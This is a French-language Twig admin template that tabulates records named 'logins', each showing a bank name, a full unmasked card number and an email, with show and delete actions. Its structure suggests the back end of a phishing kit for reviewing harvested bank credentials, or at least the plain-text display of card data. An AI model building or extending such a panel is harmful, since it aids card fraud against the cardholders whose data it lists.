{% extends "@admin/base.html.twig" %}

{% block body %}

<!--breadcrumb-->
<div class="page-breadcrumb d-none d-sm-flex align-items-center mb-3">
    <div class="breadcrumb-title pe-3">Informations cartes bancaire</div>
    <div class="ps-3">
        <nav aria-label="breadcrumb">
            <ol class="breadcrumb mb-0 p-0">
                <li class="breadcrumb-item"><a href="javascript:;"><i class="bx bx-home-alt"></i></a>
                </li>
                <li class="breadcrumb-item active" aria-current="page">Informations cartes bancaire</li>
            </ol>
        </nav>
    </div>
</div>
<!--end breadcrumb-->
<div class="row">
    <div class="col-md-8">
        <div class="card">
            <div class="card-body">
                <div class="table-responsive">
                    <table id="tab2" class="table table-striped table-bordered" style="width:100%">
                            <thead>
                                <tr>
                                    <th>Banque</th>
                                    <th>Numero</th>
                                    <th>Email</th>
                                    <th>actions</th>
                                </tr>
                            </thead>
                            <tbody>
                            {% for login in logins %}
                                <tr>
                                    <td>{{ login.bank.name }}</td>
                                    <td>{{ login.ccnumber }}</td>
                                    <td>{{ login.email }}</td>
                                    <td>
                                        <a class="btn btn-primary" href="{{ path('app_login_show', {'id': login.id}) }}">show</a>
                                        {{ include('@admin/login/_delete_form.html.twig') }}
                                    </td>
                                </tr>
                            {% else %}
                                <tr>
                                    <td colspan="11">Aucune données</td>
                                </tr>
                            {% endfor %}
                            </tbody>
                        </table>

                </div>
            </div>
        </div>
    </div>
</div>

  
{% endblock %}
